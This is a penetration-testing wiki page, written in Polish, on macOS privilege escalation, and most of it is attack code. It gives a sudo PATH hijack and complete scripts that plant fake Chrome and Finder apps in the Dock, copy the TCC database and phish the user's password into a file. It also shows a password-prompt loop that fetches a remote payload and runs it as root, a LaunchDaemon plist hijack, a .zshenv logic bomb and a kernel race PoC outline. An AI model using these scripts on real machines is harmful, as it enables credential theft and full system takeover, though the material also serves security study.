# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Jeśli trafiłeś tutaj w poszukiwaniu TCC privilege escalation, przejdź do:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Pamiętaj, że **większość trików związanych z privilege escalation dotyczących systemów Linux/Unix będzie działać również na maszynach MacOS**. Zobacz więc:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcja z użytkownikiem

### Sudo Hijacking

Oryginalną [technikę Sudo Hijacking znajdziesz we wpisie Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Jednak macOS **zachowuje** wartość **`PATH`** użytkownika, gdy wykonuje on **`sudo`**. Oznacza to, że innym sposobem przeprowadzenia tego ataku byłoby **przejęcie innych plików binarnych**, które ofiara nadal wykonuje podczas **uruchamiania sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Zauważ, że użytkownik korzystający z terminala z dużym prawdopodobieństwem ma **Homebrew zainstalowane**. Możliwe jest więc przejęcie binariów w **`/opt/homebrew/bin`**.

### Dock Impersonation

Wykorzystując **social engineering**, możesz na przykład **podszyć się pod Google Chrome** w Docku i faktycznie uruchomić własny skrypt:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Kilka sugestii:

- Sprawdź w Docku, czy znajduje się tam Chrome, a jeśli tak, **usuń** ten wpis i **dodaj** **fałszywy** wpis **Chrome** w tej samej pozycji w tablicy Docka.

<details>
<summary>Skrypt podszywający się pod Chrome w Docku</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Kilka sugestii:

- **Nie możesz usunąć Findera z Docka**, więc jeśli zamierzasz dodać go do Docka, możesz umieścić fałszywego Findera tuż obok prawdziwego. W tym celu musisz **dodać wpis fałszywego Findera na początku tablicy Docka**.
- Inną opcją jest nieumieszczanie go w Docku i po prostu jego otwarcie — komunikat „Finder prosi o możliwość sterowania Finderem” nie jest szczególnie dziwny.
- Inną opcją **eskalacji do roota bez pytania** o hasło za pomocą przerażającego okna jest sprawienie, aby Finder rzeczywiście poprosił o hasło w celu wykonania uprzywilejowanej operacji:
- Poproś Findera o skopiowanie do **`/etc/pam.d`** nowego pliku **`sudo`** (monit z prośbą o hasło będzie informował, że „Finder chce skopiować sudo”).
- Poproś Findera o skopiowanie nowego **Authorization Plugin** (możesz kontrolować nazwę pliku, dzięki czemu monit z prośbą o hasło będzie informował, że „Finder chce skopiować Finder.bundle”).

<details>
<summary>Skrypt impersonacji Findera w Docku</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware często nadużywa interakcji z użytkownikiem, aby **przechwycić hasło użytkownika uprawnionego do sudo** i ponownie wykorzystać je programowo. Typowy przebieg:

1. Zidentyfikuj zalogowanego użytkownika za pomocą `whoami`.
2. **Powtarzaj monity o hasło** do momentu, aż `dscl . -authonly "$user" "$pw"` zwróci powodzenie.
3. Zapisz dane uwierzytelniające w cache (np. `/tmp/.pass`) i wykonuj uprzywilejowane działania za pomocą `sudo -S` (hasło przez stdin).

Przykładowy minimalny łańcuch:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Skradzione hasło można następnie ponownie wykorzystać do **wyczyszczenia kwarantanny Gatekeeper za pomocą `xattr -c`**, kopiowania LaunchDaemons lub innych uprzywilejowanych plików oraz uruchamiania dodatkowych etapów w sposób nieinteraktywny.

## Nowsze wektory specyficzne dla macOS (2023–2025)

### Przestarzałe `AuthorizationExecuteWithPrivileges` nadal użyteczne

`AuthorizationExecuteWithPrivileges` zostało oznaczone jako przestarzałe w wersji 10.7, ale **nadal działa w Sonoma/Sequoia**. Wiele komercyjnych aktualizatorów wywołuje `/usr/libexec/security_authtrampoline` z niezaufaną ścieżką. Jeśli docelowy plik binarny jest zapisywalny przez użytkownika, możesz umieścić trojana i wykorzystać legalny monit:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Połącz z **powyższymi trikami masquerading**, aby wyświetlić wiarygodne okno dialogowe hasła.


### Privileged helper / XPC triage

Wiele współczesnych privescs dla macOS pochodzących od firm trzecich korzysta z tego samego schematu: **root LaunchDaemon** udostępnia usługę **Mach/XPC** z **`/Library/PrivilegedHelperTools`**, a następnie helper albo **nie weryfikuje klienta**, weryfikuje go **zbyt późno** (race PID), albo udostępnia **root method**, która wykorzystuje **ścieżkę/skrypt kontrolowany przez użytkownika**. Ta klasa błędów leży u podstaw wielu niedawnych błędów w helperach klientów VPN, launcherów gier i updaterów.

Szybka checklista triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Zwróć szczególną uwagę na helpery, które:

- nadal akceptują żądania **po odinstalowaniu**, ponieważ zadanie pozostało załadowane w `launchd`
- wykonują skrypty lub odczytują konfigurację z **`/Applications/...`** albo innych ścieżek zapisywalnych przez użytkowników innych niż root
- polegają na walidacji peerów opartej na **PID** lub wyłącznie na **bundle-id**, którą można potencjalnie wykorzystać w ramach race condition

Więcej informacji na temat błędów autoryzacji helperów znajdziesz na [tej stronie](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Dziedziczenie środowiska skryptów PackageKit (CVE-2024-27822)

Do czasu naprawienia tego błędu przez Apple w wersjach **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5** instalacje inicjowane przez użytkownika za pośrednictwem **`Installer.app`** / **`PackageKit.framework`** mogły wykonywać **skrypty PKG jako root wewnątrz środowiska bieżącego użytkownika**. Oznacza to, że pakiet używający **`#!/bin/zsh`** ładowałby **`~/.zshenv`** atakującego i uruchamiał go jako **root**, gdy ofiara zainstalowałaby pakiet.

Jest to szczególnie interesujące jako **logic bomb**: wystarczy uzyskać foothold na koncie użytkownika i mieć zapisywalny plik startowy powłoki, a następnie czekać, aż użytkownik uruchomi dowolny podatny instalator oparty na **zsh**. Zasadniczo nie dotyczy to wdrożeń **MDM/Munki**, ponieważ są one uruchamiane wewnątrz środowiska użytkownika root.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Jeśli chcesz dokładniej przeanalizować nadużycia specyficzne dla installerów, sprawdź również [tę stronę](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Jeśli plist LaunchDaemon lub jego element docelowy `ProgramArguments` jest **zapisywalny przez użytkownika**, możesz uzyskać eskalację uprawnień, podmieniając go, a następnie wymuszając ponowne załadowanie przez launchd:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Odzwierciedla to wzorzec exploitacji opublikowany dla **CVE-2025-24085**, w którym zapisywalny plik plist został wykorzystany do wykonania kodu atakującego z uprawnieniami root.

### Race w poświadczeniach XNU SMR (CVE-2025-24118)

**Race w `kauth_cred_proc_update`** umożliwia lokalnemu atakującemu uszkodzenie wskaźnika poświadczeń tylko do odczytu (`proc_ro.p_ucred`) poprzez wykonywanie równoległych pętli `setgid()`/`getgid()` w wielu wątkach, aż do wystąpienia rozerwanego `memcpy`. Pomyślne uszkodzenie zapewnia **uid 0** oraz dostęp do pamięci kernela. Minimalna struktura PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Połącz to z **heap grooming**, aby umieścić kontrolowane dane w miejscu, z którego wskaźnik zostanie ponownie odczytany. W podatnych buildach zapewnia to niezawodny **local kernel privesc** bez konieczności omijania SIP.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Jeśli masz już root, SIP nadal blokuje zapisy do lokalizacji systemowych. Błąd **Migraine** wykorzystuje entitlement Migration Assistant `com.apple.rootless.install.heritable` do uruchomienia procesu potomnego, który dziedziczy SIP bypass i nadpisuje chronione ścieżki (np. `/System/Library/LaunchDaemons`). Łańcuch wygląda następująco:

1. Uzyskaj root w działającym systemie.
2. Wywołaj `systemmigrationd` za pomocą spreparowanego stanu, aby uruchomić binarkę kontrolowaną przez atakującego.
3. Użyj dziedziczonego entitlementu do modyfikacji plików chronionych przez SIP, uzyskując persistence nawet po ponownym uruchomieniu.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Wiele daemonów Apple akceptuje obiekty **NSPredicate** przez XPC i sprawdza wyłącznie pole `expressionType`, które jest kontrolowane przez atakującego. Tworząc predicate wykonujący dowolne selektory, można uzyskać **code execution w usługach root/system XPC** (np. `coreduetd`, `contextstored`). W połączeniu z początkowym app sandbox escape umożliwia to **privilege escalation bez monitów użytkownika**. Szukaj endpointów XPC, które deserializują predykaty i nie mają solidnego visitora.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Dowolny użytkownik** (nawet bez uprzywilejowania) może utworzyć i zamontować snapshot Time Machine za pomocą `-o noowners` oraz **uzyskać dostęp do WSZYSTKICH plików** tego snapshotu, omijając kontrole własności na aktywnym woluminie. Jedynym wymaganym uprawnieniem jest posiadanie przez używaną aplikację (np. `Terminal`) uprawnienia **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Polecenia i pełne wyjaśnienie znajdują się na stronie TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Może to być przydatne do eskalacji uprawnień:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
